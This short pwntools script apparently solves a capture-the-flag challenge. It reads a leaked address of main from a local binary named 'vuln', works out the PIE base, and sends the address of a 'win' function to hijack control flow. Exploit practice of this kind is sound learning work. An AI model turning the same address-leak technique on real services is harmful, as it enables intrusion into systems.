#!/bin/python3

from pwn import *

elf = ELF("./vuln")
p = process("./vuln")

main_offset = elf.symbols["main"]
win_offset = elf.symbols["win"]

base_addr = p.recvuntil("\n").decode("latin-1")
base_addr = int(base_addr.split(":")[1].strip(), 16)
base_addr = base_addr - main_offset

print(type(win_offset))
print(type(base_addr))

win_addr = hex(base_addr + win_offset)

p.sendline(win_addr)
print(p.recvall().decode('latin-1'))
